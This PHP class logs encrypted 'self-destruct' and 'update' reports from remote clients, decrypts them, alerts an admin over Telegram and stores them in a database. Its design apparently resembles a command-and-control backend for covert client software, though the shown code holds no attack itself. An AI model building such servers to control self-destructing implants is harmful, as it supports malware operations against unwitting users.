<?php

class LoggerBot
{

    private function handleSelfDestructReport($data)
    {
        try {
            $this->logWebhook("Self-destruct report: " . json_encode($data));

            $clientId = $data['client_id'] ?? null;
            if (!$clientId) {
                $this->logError("Self-destruct report failed: Missing client_id");
                http_response_code(400);
                return ['error' => 'Missing client_id'];
            }

            $report = '';
            if (isset($data['report']) && !empty($data['report'])) {
                $this->logWebhook("Received self-destruct report for client_id: $clientId, data: " . substr($data['report'], 0, 50) . "...");
                $report = $this->decrypt($data['report']);
                if ($report === '') {
                    $this->logError("Self-destruct report decryption failed or empty for client_id: $clientId");
                } else {
                    $jsonCheck = json_decode($report, true);
                    if (json_last_error() !== JSON_ERROR_NONE) {
                        $this->logError("Self-destruct report is not valid JSON for client_id: $clientId, data: " . substr($report, 0, 50) . "...");
                        $report = '';
                    } else {
                        $this->logWebhook("Decrypted self-destruct report for client_id: $clientId, length: " . strlen($report));
                    }
                }
            } else {
                $this->logWebhook("No self-destruct report provided for client_id: $clientId");
            }

            if ($report) {
                $reportData = json_decode($report, true);
                $message = "🚨 Self-destruct initiated for client $clientId!\nDetails: " . json_encode($reportData, JSON_PRETTY_PRINT);
                $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
            }

            try {
                $stmt = $this->pdo->prepare(
                    "INSERT INTO client_logs (client_id, log_type, message, created_at) 
                VALUES (?, 'self_destruct', ?, NOW())"
                );
                $stmt->execute([$clientId, $report]);
                $this->logWebhook("Logged self-destruct report for client_id: $clientId");
            } catch (PDOException $e) {
                $this->logError("Failed to log self-destruct report for client_id: $clientId, error: " . $e->getMessage());
            }

            return ['status' => 'success'];
        } catch (Exception $e) {
            $this->logError("Self-destruct report failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Report failed: ' . $e->getMessage()];
        }
    }

    private function handleUpdateReport($data)
    {
        try {
            $this->logWebhook("Update report: " . json_encode($data));

            $clientId = $data['client_id'] ?? null;
            if (!$clientId) {
                $this->logError("Update report failed: Missing client_id");
                http_response_code(400);
                return ['error' => 'Missing client_id'];
            }

            $report = '';
            if (isset($data['report']) && !empty($data['report'])) {
                $this->logWebhook("Received update report for client_id: $clientId, data: " . substr($data['report'], 0, 50) . "...");
                $report = $this->decrypt($data['report']);
                if ($report === '') {
                    $this->logError("Update report decryption failed or empty for client_id: $clientId");
                } else {
                    $jsonCheck = json_decode($report, true);
                    if (json_last_error() !== JSON_ERROR_NONE) {
                        $this->logError("Update report is not valid JSON for client_id: $clientId, data: " . substr($report, 0, 50) . "...");
                        $report = '';
                    } else {
                        $this->logWebhook("Decrypted update report for client_id: $clientId, length: " . strlen($report));
                    }
                }
            } else {
                $this->logWebhook("No update report provided for client_id: $clientId");
            }

            if ($report) {
                $reportData = json_decode($report, true);
                $message = "🔄 Client $clientId updated to version {$reportData['new_version']}.\nDetails: " . json_encode($reportData, JSON_PRETTY_PRINT);
                $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
            }

            try {
                $stmt = $this->pdo->prepare(
                    "INSERT INTO client_logs (client_id, log_type, message, created_at) 
                VALUES (?, 'update', ?, NOW())"
                );
                $stmt->execute([$clientId, $report]);
                $this->logWebhook("Logged update report for client_id: $clientId");
            } catch (PDOException $e) {
                $this->logError("Failed to log update report for client_id: $clientId, error: " . $e->getMessage());
            }

            return ['status' => 'success'];
        } catch (Exception $e) {
            $this->logError("Update report failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Report failed: ' . $e->getMessage()];
        }
    }
}
